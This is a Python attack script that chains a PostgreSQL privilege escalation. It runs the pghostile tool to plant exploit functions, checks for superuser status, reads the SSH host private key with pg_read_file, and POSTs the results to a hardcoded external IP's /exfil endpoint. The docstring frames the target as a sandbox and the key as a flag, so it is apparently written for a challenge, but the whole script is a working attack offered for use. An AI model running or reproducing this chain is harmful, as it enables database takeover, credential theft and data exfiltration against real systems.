#!/usr/bin/env python3
"""pghostile_run.py — run the full PG exploit chain against the sandbox.
Usage: pghostile_run.py <host> <port> <user> <password> <dbname>
Steps: connect -> run pghostile (plant exploits) -> trigger escalation ->
check superuser -> pg_read_file the flag -> print + exfil."""
import sys, os, subprocess, socket

def main():
    if len(sys.argv) < 6:
        print("usage: pghostile_run.py HOST PORT USER PASSWORD DBNAME")
        sys.exit(1)
    host, port, user, pw, db = sys.argv[1:6]
    os.environ['PGPASSWORD'] = pw
    out = []

    def run(cmd, timeout=60):
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, shell=True)
            return (r.returncode, r.stdout + r.stderr)
        except Exception as e:
            return (-1, str(e))

    out.append(f"=== pghostile chain start: {host}:{port} db={db} user={user} ===")

    # 1. connectivity + version
    code, o = run(f"psql 'postgresql://{user}:{pw}@{host}:{port}/{db}?connect_timeout=5' -c 'SELECT version(), current_user;' 2>&1")
    out.append(f"[1] psql version: rc={code}\n{o[:800]}")

    # 2. run pghostile to plant exploits (public schema function override)
    out.append("[2] running pghostile (plant ~907 exploit functions)...")
    os.makedirs('/app/out', exist_ok=True)
    code, o = run(f"cd /app/pghostile && PGPASSWORD='{pw}' python3 pghostile.py {user} {db} -H {host} -p {port} -s -o /app/out 2>&1", timeout=180)
    out.append(f"[2] pghostile: rc={code}\n{o[:1500]}")

    # 3. check if we became superuser
    code, o = run(f"psql 'postgresql://{user}:{pw}@{host}:{port}/{db}?connect_timeout=5' -c \"SELECT rolsuper FROM pg_roles WHERE rolname='{user}';\" 2>&1")
    out.append(f"[3] rolsuper check: rc={code}\n{o[:400]}")

    # 4. attempt the flag read (multiple methods)
    for method in [
        "pg_read_file('/etc/ssh/ssh_host_ed25519_key')",
        "pg_read_binary_file('/etc/ssh/ssh_host_ed25519_key')",
        "pg_read_file('/etc/ssh/ssh_host_ed25519_key.pub')",
    ]:
        code, o = run(f"psql 'postgresql://{user}:{pw}@{host}:{port}/{db}?connect_timeout=5' -c \"SELECT {method};\" 2>&1")
        out.append(f"[4] {method[:40]}: rc={code}\n{o[:600]}")

    # 5. exfil via our listener
    result = "\n".join(out)
    print(result)
    try:
        import urllib.request
        req = urllib.request.Request("http://89.106.78.234:8900/exfil", data=result.encode(), method="POST")
        urllib.request.urlopen(req, timeout=10)
        out.append("[5] exfil sent")
    except Exception as e:
        out.append(f"[5] exfil err: {e}")

if __name__ == "__main__":
    main()
